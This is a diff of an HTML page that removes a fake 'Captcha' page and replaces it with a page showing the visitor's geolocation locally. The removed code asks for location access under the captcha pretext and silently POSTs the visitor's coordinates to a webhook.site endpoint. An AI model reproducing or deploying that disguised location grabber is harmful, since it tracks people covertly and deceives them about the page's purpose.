@@ -1,34 +1,116 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Captcha</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Data Link</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles for Inter font */
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+    </style>
 </head>
-<body>
-  <h2>Fetching Your Captcha</h2>
-  <p>If asked, please allow location access.</p>
+<body class="bg-gradient-to-br from-blue-100 to-purple-100 min-h-screen flex items-center justify-center p-4">
+    <div class="bg-white p-8 rounded-xl shadow-lg max-w-md w-full text-center">
+        <h1 class="text-3xl font-bold text-gray-800 mb-6">Your Geolocation Data</h1>
 
-  <script>
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        fetch("https://webhook.site/b806296e-3a5d-47df-8a3b-44df4e195d6c", {
-          method: "POST",
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date().toISOString()
-          })
-        });
-        document.body.innerHTML += "<p>Location sent successfully!</p>";
-      }, function(error) {
-        document.body.innerHTML += "<p>Location access denied or failed.</p>";
-      });
-    } else {
-      document.body.innerHTML += "<p>Geolocation not supported on this device.</p>";
-    }
-  </script>
+        <p class="text-gray-600 mb-4">
+            This page is attempting to retrieve your current location. Please grant permission if prompted by your browser.
+        </p>
+
+        <div id="location-display" class="bg-gray-50 p-6 rounded-lg border border-gray-200 text-left mb-6">
+            <p class="text-gray-700 font-semibold mb-2">Status:</p>
+            <p id="status" class="text-blue-600">Attempting to get location...</p>
+            <div id="coordinates" class="mt-4 hidden">
+                <p class="text-gray-700 font-semibold mb-1">Latitude: <span id="latitude" class="font-normal text-gray-800"></span></p>
+                <p class="text-gray-700 font-semibold">Longitude: <span id="longitude" class="font-normal text-gray-800"></span></p>
+            </div>
+        </div>
+
+        <p class="text-sm text-gray-500">
+            <strong class="text-red-500">Important Privacy Note:</strong> Geolocation data is sensitive. This page requests your browser's permission to access your location. This data is processed client-side and is not stored or transmitted by this simple HTML page. For a real-world application, you would need a secure backend to collect and store this information, always with user consent and clear privacy policies.
+        </p>
+        <p class="text-sm text-gray-500 mt-2">
+            Also, geolocation typically requires a secure connection (HTTPS) to function in modern browsers.
+        </p>
+    </div>
+
+    <script>
+        // Get references to HTML elements
+        const statusElement = document.getElementById('status');
+        const coordinatesDiv = document.getElementById('coordinates');
+        const latitudeElement = document.getElementById('latitude');
+        const longitudeElement = document.getElementById('longitude');
+
+        /**
+         * Attempts to get the user's current geolocation.
+         * Uses navigator.geolocation.getCurrentPosition() API.
+         */
+        function getLocation() {
+            // Check if the browser supports geolocation
+            if (navigator.geolocation) {
+                // Request the current position
+                // Options: enableHighAccuracy (more precise, uses more power), timeout, maximumAge
+                navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000, // 10 seconds
+                    maximumAge: 0 // No cached position
+                });
+            } else {
+                // Geolocation is not supported by this browser
+                statusElement.textContent = "Geolocation is not supported by your browser.";
+                statusElement.classList.remove('text-blue-600');
+                statusElement.classList.add('text-red-600');
+            }
+        }
+
+        /**
+         * Callback function for successful geolocation retrieval.
+         * @param {GeolocationPosition} position - The GeolocationPosition object.
+         */
+        function showPosition(position) {
+            statusElement.textContent = "Location found!";
+            statusElement.classList.remove('text-blue-600');
+            statusElement.classList.add('text-green-600');
+
+            // Display the coordinates
+            latitudeElement.textContent = position.coords.latitude;
+            longitudeElement.textContent = position.coords.longitude;
+            coordinatesDiv.classList.remove('hidden'); // Show the coordinates div
+        }
+
+        /**
+         * Callback function for geolocation errors.
+         * @param {GeolocationPositionError} error - The GeolocationPositionError object.
+         */
+        function showError(error) {
+            coordinatesDiv.classList.add('hidden'); // Hide coordinates if there's an error
+            statusElement.classList.remove('text-blue-600');
+            statusElement.classList.add('text-red-600');
+
+            // Handle different error codes
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    statusElement.textContent = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    statusElement.textContent = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    statusElement.textContent = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    statusElement.textContent = "An unknown error occurred.";
+                    break;
+            }
+        }
+
+        // Call getLocation when the page loads
+        window.onload = getLocation;
+    </script>
 </body>
 </html>
+
